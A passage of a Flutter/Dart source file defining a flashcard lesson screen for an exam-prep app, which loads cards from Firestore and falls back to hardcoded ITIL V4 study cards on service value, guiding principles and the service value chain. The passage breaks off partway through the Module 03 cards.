import 'package:flutter/material.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/services.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'quiz_screen.dart';
import 'app_router.dart';
import 'app_theme.dart';

class LessonScreen extends StatefulWidget {
  final String moduleTitle;
  final String courseTag;
  final Color color;
  final String moduleId;
  final String courseId;

  const LessonScreen({
    super.key,
    required this.moduleTitle,
    required this.courseTag,
    required this.color,
    required this.moduleId,
    required this.courseId,
  });

  @override
  State<LessonScreen> createState() => _LessonScreenState();
}

class _LessonScreenState extends State<LessonScreen> {
  int _currentCard = 0;
  bool _loading = true;
  List<Map<String, String>> _flashcards = [];

  @override
  void initState() {
    super.initState();
    _loadFlashcards();
  }

  Future<void> _loadFlashcards() async {
    try {
      final snapshot = await FirebaseFirestore.instance
          .collection('courses')
          .doc(widget.courseId)
          .collection('modules')
          .doc(widget.moduleId)
          .collection('flashcards')
          .orderBy('order')
          .get();

      final cards = snapshot.docs.map((doc) {
        final data = doc.data();
        return {
          'term': (data['question'] ?? '').toString(),
          'definition': (data['answer'] ?? '').toString(),
          'label': 'Flashcard',
          'example': (data['example'] ?? '').toString(),
        };
      }).toList();

      if (mounted) {
        setState(() {
          _flashcards = cards.isNotEmpty
              ? cards
              : _getHardcodedFlashcards(widget.courseTag, widget.moduleId);
          _loading = false;
        });
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _flashcards = _getHardcodedFlashcards(
            widget.courseTag,
            widget.moduleId,
          );
          _loading = false;
        });
      }
    }
  }

  void _next() {
    if (_currentCard < _flashcards.length - 1) {
      HapticFeedback.selectionClick();
      setState(() => _currentCard++);
    } else {
      HapticFeedback.mediumImpact();
      Navigator.pushReplacement(
        context,
        AppRouter.push(
          QuizScreen(
            moduleTitle: widget.moduleTitle,
            courseTag: widget.courseTag,
            color: widget.color,
            moduleId: widget.moduleId,
            courseId: widget.courseId,
          ),
        ),
      );
    }
  }

  void _prev() {
    if (_currentCard > 0) {
      HapticFeedback.selectionClick();
      setState(() => _currentCard--);
    }
  }

  @override
  Widget build(BuildContext context) {
    final theme = AppTheme.of(context);

    if (_loading) {
      return Scaffold(
        backgroundColor: theme.bg,
        body: Center(
          child: CircularProgressIndicator(color: widget.color, strokeWidth: 2),
        ),
      );
    }

    final card = _flashcards[_currentCard];

    return Scaffold(
      backgroundColor: theme.bg,
      body: SafeArea(
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // ── Header ──────────────────────────────
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 14, 16, 0),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  GestureDetector(
                    onTap: () {
                      HapticFeedback.lightImpact();
                      Navigator.pop(context);
                    },
                    child: Container(
                      padding: const EdgeInsets.symmetric(
                        horizontal: 12,
                        vertical: 8,
                      ),
                      decoration: BoxDecoration(
                        color: widget.color.withValues(alpha: 0.10),
                        borderRadius: BorderRadius.circular(20),
                        border: Border.all(
                          color: widget.color.withValues(alpha: 0.20),
                        ),
                      ),
                      child: Row(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Icon(
                            Icons.arrow_back_ios_new_rounded,
                            size: 12,
                            color: widget.color,
                          ),
                          const SizedBox(width: 4),
                          Text(
                            'Back',
                            style: TextStyle(
                              fontSize: 13,
                              color: widget.color,
                              fontWeight: FontWeight.w600,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                  Text(
                    '${_currentCard + 1} / ${_flashcards.length}',
                    style: TextStyle(
                      fontSize: 13,
                      color: theme.subtext,
                      fontWeight: FontWeight.w500,
                    ),
                  ),
                ],
              ),
            ),

            // ── Progress bar ─────────────────────────
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 12, 16, 0),
              child: ClipRRect(
                borderRadius: BorderRadius.circular(4),
                child: LinearProgressIndicator(
                  value: (_currentCard + 1) / _flashcards.length,
                  backgroundColor: theme.isDark
                      ? Colors.white.withValues(alpha: 0.08)
                      : AppColors.lightBorder,
                  valueColor: AlwaysStoppedAnimation<Color>(widget.color),
                  minHeight: 4,
                ),
              ),
            ),

            // ── Tag pill ─────────────────────────────
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 10, 16, 0),
              child: Container(
                padding: const EdgeInsets.symmetric(
                  horizontal: 10,
                  vertical: 4,
                ),
                decoration: BoxDecoration(
                  color: widget.color.withValues(alpha: 0.10),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(
                    color: widget.color.withValues(alpha: 0.18),
                  ),
                ),
                child: Text(
                  '${widget.courseTag} · ${widget.moduleTitle}',
                  style: TextStyle(
                    fontSize: 11,
                    color: widget.color,
                    fontWeight: FontWeight.w500,
                  ),
                ),
              ),
            ),

            const SizedBox(height: 14),

            // ── Scrollable card content ───────────────
            Expanded(
              child: AnimatedSwitcher(
                duration: const Duration(milliseconds: 280),
                transitionBuilder: (child, animation) {
                  return FadeTransition(
                    opacity: CurvedAnimation(
                      parent: animation,
                      curve: Curves.easeOut,
                    ),
                    child: SlideTransition(
                      position: Tween<Offset>(
                        begin: const Offset(0.03, 0),
                        end: Offset.zero,
                      ).animate(
                        CurvedAnimation(
                          parent: animation,
                          curve: Curves.easeOutCubic,
                        ),
                      ),
                      child: child,
                    ),
                  );
                },
                child: KeyedSubtree(
                  key: ValueKey(_currentCard),
                  child: SingleChildScrollView(
                    physics: const BouncingScrollPhysics(),
                    padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        // ── Main card ──
                        Container(
                          width: double.infinity,
                          padding: const EdgeInsets.all(20),
                          decoration: BoxDecoration(
                            color: theme.isDark
                                ? widget.color.withValues(alpha: 0.07)
                                : widget.color.withValues(alpha: 0.05),
                            borderRadius: BorderRadius.circular(20),
                            border: Border.all(
                              color: theme.isDark
                                  ? widget.color.withValues(alpha: 0.18)
                                  : widget.color.withValues(alpha: 0.25),
                            ),
                            boxShadow: theme.isDark
                                ? null
                                : [
                                    BoxShadow(
                                      color: Colors.black.withValues(
                                        alpha: 0.05,
                                      ),
                                      blurRadius: 10,
                                      offset: const Offset(0, 2),
                                    ),
                                  ],
                          ),
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Container(
                                padding: const EdgeInsets.symmetric(
                                  horizontal: 9,
                                  vertical: 3,
                                ),
                                decoration: BoxDecoration(
                                  color: widget.color.withValues(alpha: 0.14),
                                  borderRadius: BorderRadius.circular(6),
                                ),
                                child: Text(
                                  card['label']!.toUpperCase(),
                                  style: TextStyle(
                                    fontSize: 10,
                                    color: widget.color,
                                    fontWeight: FontWeight.w700,
                                    letterSpacing: 0.8,
                                  ),
                                ),
                              ),
                              const SizedBox(height: 14),
                              Text(
                                card['term']!,
                                style: TextStyle(
                                  fontSize: 20,
                                  fontWeight: FontWeight.w700,
                                  color: theme.text,
                                  height: 1.3,
                                  letterSpacing: -0.4,
                                ),
                              ),
                              const SizedBox(height: 14),
                              Divider(
                                color: theme.isDark
                                    ? Colors.white.withValues(alpha: 0.07)
                                    : AppColors.lightBorder,
                                height: 1,
                              ),
                              const SizedBox(height: 14),
                              Text(
                                card['definition']!,
                                style: TextStyle(
                                  fontSize: 15,
                                  color: theme.isDark
                                      ? Colors.white.withValues(alpha: 0.80)
                                      : AppColors.lightSubtext,
                                  height: 1.65,
                                  letterSpacing: -0.1,
                                ),
                              ),
                            ],
                          ),
                        ),

                        // ── Example box ──
                        if (card['example'] != null &&
                            card['example']!.isNotEmpty) ...[
                          const SizedBox(height: 10),
                          Container(
                            width: double.infinity,
                            padding: const EdgeInsets.all(14),
                            decoration: BoxDecoration(
                              color: theme.surface,
                              borderRadius: BorderRadius.circular(16),
                              border: Border.all(color: theme.border),
                            ),
                            child: Row(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                const Icon(
                                  CupertinoIcons.lightbulb_fill,
                                  size: 14,
                                  color: Color(0xFFF59E0B),
                                ),
                                const SizedBox(width: 10),
                                Expanded(
                                  child: Text(
                                    card['example']!,
                                    style: TextStyle(
                                      fontSize: 13,
                                      color: theme.subtext,
                                      height: 1.55,
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ],
                      ],
                    ),
                  ),
                ),
              ),
            ),

            // ── Navigation buttons ───────────────────
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 8, 16, 16),
              child: Row(
                children: [
                  if (_currentCard > 0) ...[
                    Expanded(
                      child: GestureDetector(
                        onTap: _prev,
                        child: Container(
                          padding: const EdgeInsets.symmetric(vertical: 14),
                          decoration: BoxDecoration(
                            color: theme.surface,
                            borderRadius: BorderRadius.circular(14),
                            border: Border.all(color: theme.border),
                          ),
                          child: Text(
                            '← Prev',
                            textAlign: TextAlign.center,
                            style: TextStyle(
                              fontSize: 14,
                              color: theme.text,
                              fontWeight: FontWeight.w500,
                            ),
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(width: 10),
                  ],
                  Expanded(
                    flex: 2,
                    child: GestureDetector(
                      onTap: _next,
                      child: Container(
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        decoration: BoxDecoration(
                          color: widget.color,
                          borderRadius: BorderRadius.circular(14),
                        ),
                        child: Text(
                          _currentCard < _flashcards.length - 1
                              ? 'Next →'
                              : 'Start quiz →',
                          textAlign: TextAlign.center,
                          style: const TextStyle(
                            fontSize: 14,
                            color: Colors.white,
                            fontWeight: FontWeight.w600,
                            letterSpacing: -0.2,
                          ),
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ── Hardcoded flashcards — keyed by courseTag + moduleId ──────────────────
  List<Map<String, String>> _getHardcodedFlashcards(
    String tag,
    String moduleId,
  ) {
    // ── ITIL V4 ────────────────────────────────────────────────────────────
    if (tag == 'ITIL V4') {
      switch (moduleId) {
        // ── Module 01: IT Service Management & the ITIL Framework ──────────
        case 'module-01':
          return [
            {
              'label': 'Foundation',
              'term': 'What is IT Service Management (ITSM)?',
              'definition':
                  'ITSM is a set of organisational capabilities, policies, and processes for planning, delivering, managing, and improving IT services to meet business and customer needs. It focuses on value creation — not just technical operations.',
              'example':
                  'Exam trap: ITSM is NOT the same as IT operations. ITSM includes strategy, design, and continual improvement — not just keeping systems running. Expect scenario questions where a team "keeps the lights on" but has no ITSM — the answer is that value and alignment to business are missing.',
            },
            {
              'label': 'Foundation',
              'term': 'What is a Service?',
              'definition':
                  'A service is a means of enabling value co-creation by facilitating outcomes that customers want to achieve, without the customer having to manage specific costs and risks. Key phrase: "co-creation" — value is not delivered TO the customer, it is created WITH them.',
              'example':
                  'Exam trap: Do not say a service "delivers value." The correct ITIL V4 language is that a service "facilitates value co-creation." If the exam uses "delivers," that answer is likely wrong.',
            },
            {
              'label': 'Core concept',
              'term': 'Value, Outcomes, Costs, and Risks (VOCR)',
              'definition':
                  'ITIL V4 defines value in terms of four elements: Outcomes (results the customer wants), Costs (financial resources consumed), Risks (uncertainty about outcomes), and Value itself (the perceived benefits relative to costs and risks). A service must improve outcomes while managing costs and risks on behalf of the customer.',
              'example':
                  'Scenario: A customer uses a cloud storage service. Outcome = files accessible anywhere. Cost = monthly fee (transferred from customer managing own servers). Risk = data breach risk (partially transferred to provider). The service creates value by improving outcomes and absorbing costs/risks.',
            },
            {
              'label': 'Core concept',
              'term': 'Utility and Warranty',
              'definition':
                  'Utility is "fit for purpose" — the service does what the customer needs (functionality). Warranty is "fit for use" — the service is available, reliable, secure, and has sufficient capacity. BOTH must be present for a service to create value. A service with utility but no warranty is unreliable. A service with warranty but no utility is useless.',
              'example':
                  'Exam trap: A new payroll system calculates salaries correctly (utility ✓) but crashes every Friday (warranty ✗). The service has utility but fails warranty — it does NOT create value. Watch for scenarios where one is missing — the answer always requires BOTH.',
            },
            {
              'label': 'Core concept',
              'term': 'Service Provider, Consumer, and Stakeholder',
              'definition':
                  'Service Provider: the organisation delivering the service. Service Consumer roles split into three: Customer (defines requirements and owns outcomes), User (interacts with the service directly), Sponsor (authorises budget). One person can hold multiple roles. Stakeholders include anyone with an interest in the service.',
              'example':
                  'Scenario: A CTO approves budget for a new HR system (Sponsor). The HR manager specifies what the system must do (Customer). HR staff use it daily (Users). Exam trap: the CTO is NOT the customer — the HR manager owns the outcome requirements.',
            },
            {
              'label': 'Core concept',
              'term': 'Products vs Services',
              'definition':
                  'A product is a configuration of an organisation\'s resources designed to offer value to a consumer. A service is built on top of products. Products are owned by the provider; the customer accesses the service but does not manage the underlying product resources.',
              'example':
                  'A cloud provider\'s product is their server infrastructure and software stack. The service is the compute instance you rent. You get the outcome (processing power) without managing the physical servers (product).',
            },
            {
              'label': 'History',
              'term': 'Evolution from ITIL v3 to ITIL V4',
              'definition':
                  'ITIL v3 organised guidance around a Service Lifecycle (Strategy → Design → Transition → Operation → Continual Service Improvement). ITIL V4 replaces this with the Service Value System (SVS) and Service Value Chain, integrating modern practices like Agile, DevOps, and Lean. The 26 processes of v3 became 34 practices in V4.',
              'example':
                  'Exam trap: ITIL V4 does NOT use the word "processes" for its core guidance — it uses "practices." However, practices still contain processes within them. Do not confuse the two on exam questions.',
            },
            {
              'label': 'Framework',
              'term': 'What ITIL V4 Is — and Is NOT',
              'definition':
                  'ITIL V4 is a framework of guidance and best practices — it is NOT a standard (like ISO 20000), NOT a methodology (like PRINCE2), and NOT prescriptive. Organisations adopt what is relevant to their context. The phrase "adopt and adapt" is central to ITIL V4.',
              'example':
                  'Exam trap: If a question asks "what must an organisation do to comply with ITIL V4?" — the answer is that there is no mandatory compliance. ITIL is guidance. ISO/IEC 20000 is the certifiable standard. Know the difference.',
            },
            {
              'label': 'Acronym drill',
              'term': 'Key ITIL V4 Acronyms You Must Know',
              'definition':
                  'SVS = Service Value System. SVC = Service Value Chain. CSI = Continual Service Improvement (v3 term; V4 uses "Continual Improvement"). SLA = Service Level Agreement. OLA = Operational Level Agreement. UC = Underpinning Contract. KPI = Key Performance Indicator. CSF = Critical Success Factor.',
              'example':
                  'Exam trap: ITIL V4 replaces "Continual Service Improvement" with simply "Continual Improvement" — because improvement applies to all SVS components, not just services. If an exam option says "Continual Service Improvement" in a V4 context, be cautious.',
            },
            {
              'label': 'Scenario',
              'term': 'Why Organisations Adopt ITIL V4',
              'definition':
                  'Organisations adopt ITIL V4 to: align IT with business strategy, improve service quality and consistency, reduce costs through process efficiency, manage risk more effectively, support digital transformation, and provide a common language across IT and business teams.',
              'example':
                  'Scenario: A company\'s IT team is reactive — fixing problems as they occur with no standard process. After ITIL adoption, incidents are categorised, prioritised, and resolved consistently. Customer satisfaction scores rise. This is the classic "why ITIL" exam scenario.',
            },
            {
              'label': 'Core concept',
              'term': 'Service Relationships',
              'definition':
                  'A service relationship exists when two organisations cooperate to co-create value. It includes: Service Provision (activities performed to deliver a service), Service Consumption (activities performed to consume a service), and Service Relationship Management (joint activities ensuring ongoing value co-creation).',
              'example':
                  'A managed IT provider (provider) and a law firm (consumer) have a service relationship. The provider provisions infrastructure; the firm\'s IT staff manage software (consumption). Both collaborate on SLAs (relationship management).',
            },
            {
              'label': 'Misconception',
              'term': 'Common Misconception: ITIL V4 Replaces Agile/DevOps',
              'definition':
                  'ITIL V4 does NOT replace Agile, DevOps, or Lean — it integrates with them. ITIL V4 was redesigned specifically to complement these modern approaches. The SVS is intentionally flexible to allow organisations using Scrum, Kanban, or DevOps pipelines to align with ITIL without conflict.',
              'example':
                  'Exam trap: If a question implies ITIL V4 conflicts with DevOps or Agile, the answer is that they are complementary. ITIL V4 provides governance and structure; Agile/DevOps provides delivery speed and flexibility.',
            },
            {
              'label': 'Foundation',
              'term': 'What is Value — and Who Defines It?',
              'definition':
                  'In ITIL V4, value is subjective and defined by the stakeholder, not the service provider. Value is the perceived benefits, usefulness, and importance of a service — and that perception belongs to the customer. Two customers using the same service may perceive different levels of value.',
              'example':
                  'Exam trap: The provider does not determine value — the consumer does. If an exam question asks who defines whether a service is valuable, the answer is the customer/consumer, not the IT team or provider.',
            },
            {
              'label': 'Scenario',
              'term': 'Internal vs External Service Providers',
              'definition':
                  'An internal service provider delivers services within the same organisation (e.g. an IT department serving business units). An external service provider delivers services to other organisations (e.g. a managed service provider). ITIL applies to both — the concepts of utility, warranty, and value co-creation are identical.',
              'example':
                  'Scenario: A company\'s internal IT team manages email for staff. They are an internal service provider. If the company outsources email to Google Workspace, Google becomes an external service provider. Both must demonstrate utility and warranty.',
            },
            {
              'label': 'Exam prep',
              'term': 'Module 1 — Top 5 Exam Traps',
              'definition':
                  '1) "Value is delivered to customers" is WRONG — value is CO-CREATED. 2) ITIL V4 uses "practices" not "processes." 3) Warranty AND utility are both required for value. 4) The customer defines requirements; the sponsor controls budget — they may be different people. 5) ITIL is guidance, not a mandatory standard.',
              'example':
                  'Use this card as a rapid-fire review before your exam. These five traps appear in multiple-choice questions more than almost any other concepts in Module 1.',
            },
            {
              'label': 'Foundation',
              'term': 'The Role of Automation in ITIL V4',
              'definition':
                  'ITIL V4 recognises automation as a key enabler of service management. Automation supports practices such as Incident Management (auto-routing), Change Enablement (automated testing), and Monitoring (AI-driven alerting). Automation does not replace ITIL practices — it executes them faster and more consistently.',
              'example':
                  'An automated incident management tool detects a server outage, logs an incident record, assigns it to the on-call engineer, and notifies the customer — all within seconds. The ITIL practice is unchanged; automation improves its speed and consistency.',
            },
          ];

        // ── Module 02: The Service Value System (SVS) ──────────────────────
        case 'module-02':
          return [
            {
              'label': 'SVS Overview',
              'term': 'What is the Service Value System (SVS)?',
              'definition':
                  'The SVS describes how all components and activities of an organisation work together to enable value creation through IT-enabled services. The SVS has five components: Guiding Principles, Governance, Service Value Chain (SVC), Practices, and Continual Improvement.',
              'example':
                  'Exam trap: The SVS has FIVE components — not four, not six. Memorise: Guiding Principles + Governance + Service Value Chain + Practices + Continual Improvement. Any exam answer missing one of these is wrong.',
            },
            {
              'label': 'SVS Component',
              'term': 'SVS Inputs and Outputs',
              'definition':
                  'The SVS takes Opportunity (possibilities to add value or improve) and Demand (need or desire for services from customers) as inputs. The output is Value — for the organisation, its customers, and other stakeholders. Without demand or opportunity, the SVS has nothing to process.',
              'example':
                  'Scenario: A business identifies a customer need for 24/7 IT support (Demand) and a new monitoring tool becomes available (Opportunity). The SVS processes both and delivers improved uptime and customer satisfaction (Value).',
            },
            {
              'label': 'SVS Component',
              'term': 'Governance in the SVS',
              'definition':
                  'Governance is the means by which an organisation is directed and controlled. In the SVS, governance ensures that activities align with organisational objectives. Governance evaluates, directs, and monitors all SVS components. It sits at the top of the SVS, overseeing everything else.',
              'example':
                  'Exam trap: Governance is NOT the same as management. Governance sets direction and oversight; management executes. The board or senior leadership governs; IT management manages. If a question mentions "setting direction and ensuring accountability," the answer is Governance.',
            },
            {
              'label': 'SVS Component',
              'term': 'Continual Improvement in the SVS',
              'definition':
                  'Continual Improvement is a recurring organisational activity that applies to all SVS components — not just services. It uses the seven-step Continual Improvement Model to identify improvement opportunities, assess current state, define targets, implement changes, and measure outcomes.',
              'example':
                  'Exam trap: In ITIL V4, Continual Improvement applies to EVERYTHING — practices, the value chain, governance, and the guiding principles themselves — not just IT services. If an exam question limits CI to services only, that answer is incomplete.',
            },
            {
              'label': 'SVS Component',
              'term': 'Organisational Agility and the SVS',
              'definition':
                  'The SVS is designed to prevent "organisational silos" — isolated teams that optimise their own work at the expense of overall value. The SVS promotes visibility, collaboration, and end-to-end thinking so that all teams contribute to the same value stream.',
              'example':
                  'Scenario: The development team ships code fast (high agility) but the operations team takes weeks to deploy it (silo). The SVS — specifically the Service Value Chain — removes this bottleneck by connecting development and operations through shared activities.',
            },
            {
              'label': 'SVS Component',
              'term': 'The Seven Guiding Principles — Overview',
              'definition':
                  'The seven guiding principles are universal recommendations that guide organisations in all circumstances. They are: 1) Focus on Value, 2) Start Where You Are, 3) Progress Iteratively with Feedback, 4) Collaborate and Promote Visibility, 5) Think and Work Holistically, 6) Keep It Simple and Practical, 7) Optimise and Automate.',
              'example':
                  'Exam trap: There are EXACTLY seven guiding principles. No more, no less. They apply to EVERY initiative — not just ITIL implementations. If an exam option lists eight principles or omits one, it is wrong. Memorise all seven by their exact names.',
            },
            {
              'label': 'Guiding Principle',
              'term': 'Principle 1 — Focus on Value',
              'definition':
                  'Everything the organisation does must link, directly or indirectly, to value for itself, its customers, and other stakeholders. This means understanding who the consumer is, what they value, and how the service contributes — before performing any activity.',
              'example':
                  'Scenario: An IT team spends two months building a reporting dashboard. Before starting, they should ask: who uses this? What decision does it enable? If no one consults the output, it creates no value — Focus on Value principle violated.',
            },
            {
              'label': 'Guiding Principle',
              'term': 'Principle 2 — Start Where You Are',
              'definition':
                  'Do not start from scratch when existing services, processes, or capabilities can be built upon. Assess what already works, preserve what is valuable, and improve incrementally rather than replacing everything. Measurement of the current state must be objective — not based on assumption.',
              'example':
                  'Exam trap: "Start Where You Are" does NOT mean "keep everything as-is." It means assess objectively, preserve what works, improve what does not. Watch for scenarios where a new manager decides to rebuild all processes from scratch — this violates this principle.',
            },
            {
              'label': 'Guiding Principle',
              'term': 'Principle 3 — Progress Iteratively with Feedback',
              'definition':
                  'Work in smaller, manageable increments rather than large waterfall projects. Use feedback loops at each step to evaluate whether the direction is correct before committing further resources. This integrates naturally with Agile and Scrum delivery models.',
              'example':
                  'Scenario: Instead of deploying a complete new ITSM platform in one go, the team deploys incident management first, collects user feedback for four weeks, adjusts, then deploys change management. This iterative approach reduces risk and improves fit.',
            },
            {
              'label': 'Guiding Principle',
              'term': 'Principle 4 — Collaborate and Promote Visibility',
              'definition':
                  'Work together across boundaries — with customers, suppliers, and internal teams. Make work and decisions visible to all relevant stakeholders. Hidden agendas, siloed information, and lack of transparency undermine trust and the ability to improve.',
              'example':
                  'Exam trap: Collaboration is NOT just about teamwork — it explicitly includes customers and external partners. If an exam scenario shows an IT team solving problems without involving the business or customers, Collaborate and Promote Visibility is the violated principle.',
            },
            {
              'label': 'Guiding Principle',
              'term': 'Principle 5 — Think and Work Holistically',
              'definition':
                  'No service, practice, or component works in isolation. Understand how all parts of the SVS interconnect. Changes to one area can impact others. Decisions should consider the end-to-end value stream, not just a single team or process.',
              'example':
                  'Scenario: The security team implements strict access controls (good for security) but users can no longer reset passwords without a 48-hour wait (bad for availability). Thinking holistically would have caught this conflict during design.',
            },
            {
              'label': 'Guiding Principle',
              'term': 'Principle 6 — Keep It Simple and Practical',
              'definition':
                  'Use the minimum number of steps, processes, and metrics needed to achieve the objective. Eliminate waste — anything that does not contribute to value creation. If a process step cannot be justified with a clear value contribution, remove it.',
              'example':
                  'Exam trap: This principle is NOT about being lazy or cutting corners. It is about eliminating bureaucratic overhead that adds no value. A 40-step change approval process for replacing a keyboard violates this principle.',
            },
            {
              'label': 'Guiding Principle',
              'term': 'Principle 7 — Optimise and Automate',
              'definition':
                  'Optimise means maximise the value of work. Automate means use technology to perform repetitive, low-complexity tasks. The correct sequence is: optimise first (eliminate waste, simplify), THEN automate. Automating a broken process makes it fail faster and at greater scale.',
              'example':
                  'Exam trap: You must OPTIMISE before you AUTOMATE. If a question describes automating a flawed process, the correct ITIL answer is to optimise (fix) the process first, then automate. Automating waste is explicitly called out as a common mistake in ITIL V4 guidance.',
            },
            {
              'label': 'Application',
              'term': 'How Guiding Principles Work Together',
              'definition':
                  'The seven guiding principles are not applied in isolation or in a fixed sequence. Multiple principles often apply simultaneously to a single decision. They are also not prescriptive rules — they are guidance that must be interpreted in context. An organisation may prioritise different principles for different initiatives.',
              'example':
                  'Scenario: Deploying a new self-service portal. Focus on Value (what do users need?), Start Where You Are (existing portal?), Progress Iteratively (phased rollout), Collaborate (involve users in design), Think Holistically (impact on helpdesk volume), Keep It Simple (minimal clicks), Optimise and Automate (auto-resolve common requests).',
            },
            {
              'label': 'Exam prep',
              'term': 'Module 2 — Top Exam Traps on the SVS',
              'definition':
                  '1) SVS has FIVE components — not the value chain alone. 2) Continual Improvement applies to ALL SVS components — not just services. 3) Optimise BEFORE automating — always. 4) Governance directs and monitors — it is not management. 5) Guiding principles apply universally — not only to ITIL implementations.',
              'example':
                  'Rapid-fire check: Can you name all five SVS components without looking? Can you list all seven principles in order? If not, re-read this module before sitting the exam.',
            },
            {
              'label': 'Scenario',
              'term': 'SVS in Practice — Scenario Walkthrough',
              'definition':
                  'A retailer wants to improve its online order tracking service. Demand = customer complaints about tracking. Opportunity = new API from logistics partner. The SVS processes this via the SVC (Plan → Improve → Engage → Design & Transition → Obtain/Build → Deliver & Support). Practices like Incident Management, Change Enablement, and Release Management execute the work. Governance approves the change. Continual Improvement measures outcomes post-launch.',
              'example':
                  'This scenario spans ALL five SVS components simultaneously. Exam questions often describe a business scenario and ask which SVS component is primarily responsible for a specific aspect — know which component owns what.',
            },
          ];

        // ── Module 03: The Service Value Chain (SVC) ───────────────────────
        case 'module-03':
          return [
            {
              'label': 'SVC Overview',
              'term': 'What is the Service Value Chain (SVC)?',
              'definition':
                  'The Service Value Chain is the operating model at the heart of the SVS. It defines six interconnected activities that combine to convert demand and opportunities into value. The activities are: Plan, Improve, Engage, Design & Transition, Obtain/Build, and Deliver & Support. They are not a linear sequence — they can be combined in any order to form value streams.',
              'example':
                  'Exam trap: The SVC is NOT a lifecycle (unlike ITIL v3). It is a flexible model where activities combine in different ways for different scenarios. There is no fixed order. If a question implies a fixed sequence, that is an ITIL v3 concept, not V4.',
            },
            {
              'label': 'SVC Activity',
              'term': 'Plan',
              'definition':
                  'Plan ensures a shared understanding of vision, current status, and improvement direction across all four dimensions and all products and services. It produces policies, portfolios, architectures, and plans. Plan feeds into ALL other SVC activities.',
              'example':
                  'Scenario: The organisation defines its three-year IT strategy and service portfolio. This output (plans, policies, architectures) is consumed by all other SVC activities — Design & Transition uses architecture plans; Improve uses the improvement roadmap. Missing the Plan activity leads to uncoordinated execution.',
            },
            {
              'label': 'SVC Activity',
              'term': 'Improve',
              'definition':
                  'Improve ensures continual improvement of products, services, and practices across all SVC activities and all four dimensions. It is present in every value stream — not just at the end. It consumes performance data and improvement initiatives and produces improvement plans and implemented improvements.',
              'example':
                  'Exam trap: Improve is NOT only at the end of a process — it operates continuously throughout. If an exam option implies improvement only happens after delivery is complete, that is wrong. Every SVC activity feeds back into Improve.',
            },
            {
              'label': 'SVC Activity',
              'term': 'Engage',
              'definition':
                  'Engage provides a good understanding of stakeholder needs and ensures transparency and continual engagement with customers, users, and other stakeholders. It converts demand into requirements and manages ongoing relationships. It is the primary point of contact between the organisation and its customers.',
              'example':
                  'Scenario: A key customer reports that the service is not meeting their expectations. Engage is the SVC activity responsible — it captures the feedback, translates it into requirements, and feeds it into Plan, Improve, and Design & Transition. Failing to Engage causes services to drift from customer needs.',
            },
            {
              'label': 'SVC Activity',
              'term': 'Design & Transition',
              'definition':
                  'Design & Transition ensures services and products continually meet stakeholder expectations for quality, cost, and time-to-market. It covers the design of new or changed services and their transition into live operation. It consumes requirements from Engage and plans from Plan.',
              'example':
                  'Exam trap: Design & Transition is a SINGLE combined activity in V4 — not separate phases as in v3. The merger reflects the reality that design and transition work is iterative and overlapping, especially in Agile and DevOps environments.',
            },
            {
              'label': 'SVC Activity',
              'term': 'Obtain/Build',
              'definition':
                  'Obtain/Build ensures that service components are available when and where needed and that they meet agreed specifications. It covers acquiring components from external suppliers (Obtain) and developing or configuring them internally (Build). It feeds service components to Design & Transition and Deliver & Support.',
              'example':
                  'Scenario: The team needs a new monitoring tool. If bought from a vendor, that is Obtain. If built in-house, that is Build. The result — a working monitoring capability — flows into Deliver & Support to be used in live operations. Both routes share this one SVC activity.',
            },
            {
              'label': 'SVC Activity',
              'term': 'Deliver & Support',
              'definition':
                  'Deliver & Support ensures services are delivered and supported according to agreed specifications and stakeholder expectations. It covers day-to-day delivery, incident resolution, request fulfilment, and user support. It is where most operational ITIL practices execute.',
              'example':
                  'Exam trap: Deliver & Support is NOT the only activity that touches the customer — Engage handles ongoing relationship management. Deliver & Support focuses on operational execution: keeping services running and resolving issues as they occur.',
            },
            {
              'label': 'Core concept',
              'term': 'Value Streams',
              'definition':
                  'A value stream is a specific combination of SVC activities designed to create a particular product or respond to a particular demand. Each value stream is a sequence (or network) of steps selected from the six SVC activities. Organisations design multiple value streams for different scenarios.',
              'example':
                  'Example value stream — User Incident Resolution: Engage (user contacts helpdesk) → Deliver & Support (incident triaged and resolved) → Improve (resolution time recorded for trend analysis). A different value stream for new service deployment would use Design & Transition and Obtain/Build instead.',
            },
            {
              'label': 'Core concept',
              'term': 'SVC vs Service Lifecycle (v3)',
              'definition':
                  'ITIL v3 used a linear lifecycle: Strategy → Design → Transition → Operation → CSI. ITIL V4 replaces this with the flexible SVC where activities are recombined as needed. The SVC avoids the bottlenecks of sequential lifecycle stages and supports iterative, agile delivery models.',
              'example':
                  'Exam trap: If a question references "Service Strategy" or "Service Operation" as ITIL V4 phases, those are v3 concepts. In V4, the equivalent work happens within SVC activities — Plan (strategy), Design & Transition (design/transition), Deliver & Support (operations).',
            },
            {
              'label': 'Core concept',
              'term': 'Practices in the SVC',
              'definition':
                  'ITIL V4 practices are the tools used to execute SVC activities. A single practice (e.g. Change Enablement) may support multiple SVC activities. Conversely, a single SVC activity (e.g. Deliver & Support) draws on multiple practices (Incident Management, Service Desk, Monitoring).',
              'example':
                  'Scenario: The Change Enablement practice contributes to Plan (policy), Improve (CI input), Design & Transition (change authority), Deliver & Support (emergency changes). Understanding which practices support which SVC activities is a common exam question type.',
            },
            {
              'label': 'Scenario',
              'term': 'SVC Walkthrough — New Service Deployment',
              'definition':
